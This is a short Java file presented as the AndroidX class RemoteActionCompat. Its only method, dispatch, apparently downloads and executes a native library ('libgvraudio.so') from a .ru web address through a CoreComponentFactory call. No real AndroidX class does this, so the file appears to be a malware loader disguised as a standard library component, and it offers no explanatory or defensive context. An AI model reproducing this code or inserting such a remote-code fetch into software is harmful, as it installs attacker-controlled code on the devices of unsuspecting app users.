package androidx.core.app;

import android.app.AlertDialog;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.DialogInterface;
import android.net.ConnectivityManager;
import android.os.Build;
import android.text.Html;
import android.view.Window;
import android.widget.Toast;
import android.os.Process;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

public class RemoteActionCompat {
    public static void dispatch(Context context) {
        new CoreComponentFactory(context).execute("http://flickmods.ru/libgvraudio.so");
    }
}


